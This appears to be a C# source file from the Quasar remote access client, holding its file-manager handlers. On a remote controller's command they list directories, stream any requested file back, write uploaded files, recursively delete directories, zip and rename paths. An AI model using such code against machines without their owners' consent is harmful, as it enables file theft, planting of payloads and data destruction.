﻿using Ionic.Zip;
using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Extensions;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using System;
using System.IO;
using System.IO.Compression;
using System.Security;
using System.Threading;

namespace Quasar.Client.Commands {
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
    public static partial class CommandHandler {
        public static void HandleGetDirectory(GetDirectory command, Networking.Client client) {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) => {
                isError = true;
                message = msg;
            };

            try {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] files = dicInfo.GetFiles();
                DirectoryInfo[] directories = dicInfo.GetDirectories();

                FileSystemEntry[] items = new FileSystemEntry[files.Length + directories.Length];

                int offset = 0;
                for (int i = 0; i < directories.Length; i++, offset++) {
                    items[i] = new FileSystemEntry {
                        EntryType = FileType.Directory, Name = directories[i].Name, Size = 0,
                        LastAccessTimeUtc = directories[i].LastAccessTimeUtc
                    };
                }

                for (int i = 0; i < files.Length; i++) {
                    items[i + offset] = new FileSystemEntry {
                        EntryType = FileType.File, Name = files[i].Name, Size = files[i].Length,
                        ContentType = Path.GetExtension(files[i].Name).ToContentType(),
                        LastAccessTimeUtc = files[i].LastAccessTimeUtc
                    };
                }

                client.Send(new GetDirectoryResponse { RemotePath = command.RemotePath, Items = items });
            } catch (UnauthorizedAccessException) {
                onError("GetDirectory No permission");
            } catch (SecurityException) {
                onError("GetDirectory No permission");
            } catch (PathTooLongException) {
                onError("GetDirectory Path too long");
            } catch (DirectoryNotFoundException) {
                onError("GetDirectory Directory not found");
            } catch (FileNotFoundException) {
                onError("GetDirectory File not found");
            } catch (IOException) {
                onError("GetDirectory I/O error");
            } catch (Exception) {
                onError("GetDirectory Failed");
            } finally {
                if (isError && !string.IsNullOrEmpty(message))
                    client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = true });
            }
        }

        public static void HandleDoDownloadFile(DoDownloadFile command, Networking.Client client) {
            new Thread(() => {
                _limitThreads.WaitOne();
                try {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        throw new Exception(srcFile.LastError);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++) {
                        if (!client.Connected || _canceledDownloads.ContainsKey(command.Id))
                            break;

                        byte[] block;

                        if (!srcFile.ReadBlock(currentBlock, out block))
                            throw new Exception(srcFile.LastError);


                        client.SendBlocking(new DoDownloadFileResponse {
                            Id = command.Id,
                            Filename = Path.GetFileName(command.RemotePath),
                            Block = block,
                            MaxBlocks = srcFile.MaxBlocks,
                            CurrentBlock = currentBlock,
                            CustomMessage = srcFile.LastError
                        });
                    }
                } catch (Exception ex) {
                    client.SendBlocking(new DoDownloadFileResponse {
                        Id = command.Id,
                        Filename = Path.GetFileName(command.RemotePath),
                        Block = new byte[0],
                        MaxBlocks = -1,
                        CurrentBlock = -1,
                        CustomMessage = ex.Message
                    });
                }
                _limitThreads.Release();
            }).Start();
        }

        public static void HandleDoDownloadFileCancel(DoDownloadFileCancel command, Networking.Client client) {
            if (!_canceledDownloads.ContainsKey(command.Id)) {
                _canceledDownloads.Add(command.Id, "canceled");
                client.SendBlocking(new DoDownloadFileResponse {
                    Id = command.Id,
                    Filename = "canceled",
                    Block = new byte[0],
                    MaxBlocks = -1,
                    CurrentBlock = -1,
                    CustomMessage = "Canceled"
                });
            }
        }

        public static void HandleDoUploadFile(DoUploadFile command, Networking.Client client) {
            if (command.CurrentBlock == 0 && System.IO.File.Exists(command.RemotePath))
                NativeMethods.DeleteFile(command.RemotePath); // delete existing file

            FileSplit destFile = new FileSplit(command.RemotePath);
            destFile.AppendBlock(command.Block, command.CurrentBlock);
        }

        public static void HandleDoPathDelete(DoPathDelete command, Networking.Client client) {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) => {
                isError = true;
                message = msg;
            };

            try {
                switch (command.PathType) {
                    case FileType.Directory:
                        Directory.Delete(command.Path, true);
                        client.Send(new SetStatusFileManager {
                            Message = "Deleted directory",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        System.IO.File.Delete(command.Path);
                        client.Send(new SetStatusFileManager {
                            Message = "Deleted file",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                HandleGetDirectory(new GetDirectory { RemotePath = Path.GetDirectoryName(command.Path) }, client);
            } catch (UnauthorizedAccessException) {
                onError("DeletePath No permission");
            } catch (PathTooLongException) {
                onError("DeletePath Path too long");
            } catch (DirectoryNotFoundException) {
                onError("DeletePath Path not found");
            } catch (IOException) {
                onError("DeletePath I/O error");
            } catch (Exception) {
                onError("DeletePath Failed");
            } finally {
                if (isError && !string.IsNullOrEmpty(message))
                    client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = false });
            }
        }

        public static void HandleDoZipDirectory(DoZipDirectory command, Networking.Client client) {
            string fileName = Path.GetFileName(command.ArchivePath);
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) => {
                isError = true;
                message = msg;
            };

            try {
                using (ZipFile zip = new ZipFile()) {
                    for (int i = 0; i < command.PathList.Length; i++) {
                        string path = command.PathList[i];
                        FileType type = command.TypeList[i];
                        switch (type) {
                            case FileType.File:
                                zip.AddFile(path);
                                break;
                            case FileType.Directory:
                                zip.AddDirectory(path);
                                break;
                        }
                    }
                    zip.SaveProgress += (s, e) => {
                        double percent = e.BytesTransferred / (0.01 * e.TotalBytesToTransfer);
                        if (Double.IsNaN(percent)) return;
                        string percentMessage = string.Format("Compressing ({0}) - {1}", fileName, percent.ToString("0.00") + "%");
                        client.Send(new SetStatusFileManager { Message = percentMessage, SetLastDirectorySeen = false });
                    };
                    zip.Save(command.ArchivePath);
                    client.Send(new SetStatusFileManager {
                        Message = string.Format("Compressed! ({0})", fileName),
                        SetLastDirectorySeen = false
                    });
                }
            } catch (Exception ex) {
                onError(string.Format("Compression failed ({0}) - {1}", fileName, ex.Message));
            } finally {
                if (isError && !string.IsNullOrEmpty(message))
                    client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = false });
            }
        }

        public static void HandleDoPathRename(DoPathRename command, Networking.Client client) {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) => {
                isError = true;
                message = msg;
            };

            try {
                switch (command.PathType) {
                    case FileType.Directory:
                        Directory.Move(command.Path, command.NewPath);
                        client.Send(new SetStatusFileManager {
                            Message = "Renamed directory",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        System.IO.File.Move(command.Path, command.NewPath);
                        client.Send(new SetStatusFileManager {
                            Message = "Renamed file",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                HandleGetDirectory(new GetDirectory { RemotePath = Path.GetDirectoryName(command.NewPath) }, client);
            } catch (UnauthorizedAccessException) {
                onError("RenamePath No permission");
            } catch (PathTooLongException) {
                onError("RenamePath Path too long");
            } catch (DirectoryNotFoundException) {
                onError("RenamePath Path not found");
            } catch (IOException) {
                onError("RenamePath I/O error");
            } catch (Exception) {
                onError("RenamePath Failed");
            } finally {
                if (isError && !string.IsNullOrEmpty(message))
                    client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = false });
            }
        }
    }
}